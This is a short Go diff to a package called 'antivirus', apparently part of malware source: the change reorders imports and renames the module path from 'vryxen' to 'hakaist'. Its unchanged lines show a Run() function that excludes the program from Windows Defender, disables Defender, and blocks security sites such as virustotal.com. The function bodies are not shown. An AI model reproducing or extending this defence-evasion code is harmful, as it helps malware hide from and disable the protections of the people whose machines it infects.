@@ -1,19 +1,18 @@
 package antivirus
 
 import (
-    "os"
-    "os/exec"
-    "path/filepath"
-    "errors"
-    "fmt"
-    "syscall"
-    "strings"
-    "github.com/unf6/vryxen/pkg/utils/common"
+	"errors"
+	"fmt"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"strings"
+	"syscall"
 
+	"github.com/lukyydnv/hakaist/pkg/utils/common"
 )
 
-
-func Run()  {
+func Run() {
 
 	sites := []string{
 		"virustotal.com",
@@ -50,7 +49,7 @@ func Run()  {
 	ExcludeFromDefender()
 	DisableDefender()
 	BlockSites(sites)
-	
+
 }
 
 func ExcludeFromDefender() error {
